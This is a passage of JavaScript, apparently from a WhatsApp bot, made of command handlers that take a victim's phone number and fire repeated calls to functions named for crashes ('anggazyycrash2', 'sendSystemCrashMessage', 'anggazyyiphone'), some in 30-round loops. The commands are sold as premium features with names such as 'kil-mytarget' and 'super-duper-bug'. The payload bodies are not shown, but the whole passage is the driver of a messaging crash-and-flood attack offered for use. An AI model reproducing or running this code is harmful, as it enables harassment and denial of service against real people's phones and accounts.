ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'kil-mytarget': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'super-duper-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'super-engine': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'super-system': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🐶': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🗿': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🤯': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'gen1-notif': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'generation': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'devilgas': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'attack-sql': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
sendSystemCrashMessage(target)
ngeloc(target, force)
sendSystemCrashMessage(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
sendSystemCrashMessage(target)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'attack-litesql': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'sql-button': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'gen-1': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'bug-notif': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🤡': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
